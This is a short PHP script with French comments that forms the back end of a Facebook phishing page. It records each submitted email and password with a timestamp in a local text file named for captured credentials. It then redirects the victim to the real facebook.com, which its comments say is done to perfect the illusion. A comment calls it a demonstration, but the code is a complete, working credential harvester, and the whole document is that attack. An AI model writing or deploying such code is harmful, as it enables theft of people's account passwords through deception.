<?php
// On simule l'enregistrement dans un fichier local pour la démonstration
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['email'];
    $password = $_POST['pass'];
    $timestamp = date("Y-m-d H:i:s");

    $entry = "[$timestamp] Login: $login | Pass: $password\n";
    
    // Enregistrement dans un fichier texte (doit avoir les droits d'écriture)
    file_put_contents("identifiants_captures.txt", $entry, FILE_APPEND);

    // Redirection vers le vrai service pour parfaire l'illusion
    header("Location: https://www.facebook.com");
    exit();
}
?>